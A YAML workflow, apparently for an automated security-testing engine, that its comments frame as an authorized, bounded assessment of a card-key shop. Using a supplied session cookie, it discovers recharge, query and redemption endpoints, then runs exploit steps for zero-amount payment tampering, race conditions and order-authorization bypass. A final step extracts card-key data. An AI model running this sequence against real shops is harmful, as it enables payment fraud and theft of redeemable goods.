# 用途: 对授权卡密商城执行金额、竞态和对象授权的业务逻辑验证计划。
# 前置条件: 需要有效商城会话，并限定测试商品、订单和并发规模。
# 期望结果: 提取业务端点并生成有界、可审计的业务逻辑证据。
name: card_shop_attack
description: Business-logic assessment flow with runtime target, session, field, and bounded-test parameters.
parameters:
  target_url:
    description: "目标根URL"
    required: true
    default: ""
  session_cookie:
    description: "会话Cookie（如JSESSIONID=xxx）"
    required: false
    default: ""
  csrf_token:
    description: "CSRF令牌值"
    required: false
    default: ""
  home_path:
    description: "商城首页路径"
    required: false
    default: "/"
  amount_field:
    description: "金额字段名"
    required: false
    default: "amount"
  product_id_field:
    description: "商品ID字段名"
    required: false
    default: "product_id"
  order_id_field:
    description: "订单ID字段名"
    required: false
    default: "order_id"
  test_amount:
    description: "金额篡改测试值"
    required: false
    default: "0"
  race_concurrency:
    description: "竞态测试并发数"
    required: false
    default: 5
  evidence_limit:
    description: "最多提取的卡密证据条数"
    required: false
    default: 10
start: visit-shop
steps:
  - step_id: visit-shop
    name: Visit card shop
    action: request
    state: discovery
    request:
      method: GET
      url: "${target_url}${home_path}"
      headers:
        Cookie: "${session_cookie}"
        X-CSRF-Token: "${csrf_token}"
    on_success: identify-recharge
    critical: true
  - step_id: identify-recharge
    name: Identify recharge endpoint
    action: extract
    extract_rules:
      - name: recharge_endpoint
        pattern: 'regex:(/[A-Za-z0-9_./-]*(?:recharge|charge|pay)[A-Za-z0-9_./-]*)'
        store_as: recharge_endpoint
    on_success: identify-query
  - step_id: identify-query
    name: Identify query endpoint
    action: extract
    extract_rules:
      - name: query_endpoint
        pattern: 'regex:(/[A-Za-z0-9_./-]*(?:query|status|order)[A-Za-z0-9_./-]*)'
        store_as: query_endpoint
    on_success: identify-use
  - step_id: identify-use
    name: Identify redemption endpoint
    action: extract
    extract_rules:
      - name: use_endpoint
        pattern: 'regex:(/[A-Za-z0-9_./-]*(?:use|redeem|consume)[A-Za-z0-9_./-]*)'
        store_as: use_endpoint
    on_success: test-amount
  - step_id: test-amount
    name: Plan amount-tampering proof
    action: exploit
    state: scan
    options:
      vuln_type: business_logic
      confirmed: true
      action: test_amount_tampering
      endpoint: "${target_url}${recharge_endpoint}"
      amount_field: "${amount_field}"
      product_id_field: "${product_id_field}"
      test_amount: "${test_amount}"
      session_cookie: "${session_cookie}"
      csrf_token: "${csrf_token}"
    on_success: test-race
    on_failure: ""
  - step_id: test-race
    name: Plan bounded concurrency proof
    action: exploit
    options:
      vuln_type: business_logic
      confirmed: true
      action: test_race_condition
      endpoint: "${target_url}${recharge_endpoint}"
      concurrency: "${race_concurrency}"
      session_cookie: "${session_cookie}"
    on_success: test-authorization
    on_failure: ""
  - step_id: test-authorization
    name: Plan object-authorization proof
    action: exploit
    options:
      vuln_type: business_logic
      confirmed: true
      action: test_object_authorization
      endpoint: "${target_url}${query_endpoint}"
      order_id_field: "${order_id_field}"
      session_cookie: "${session_cookie}"
    on_success: extract-card-data
    on_failure: ""
  - step_id: extract-card-data
    name: Prepare bounded card-data evidence extraction
    action: exploit
    state: post_exploit
    options:
      vuln_type: business_logic
      confirmed: true
      action: extract_card_evidence
      endpoint: "${target_url}${use_endpoint}"
      evidence_limit: "${evidence_limit}"
      session_cookie: "${session_cookie}"
    critical: true
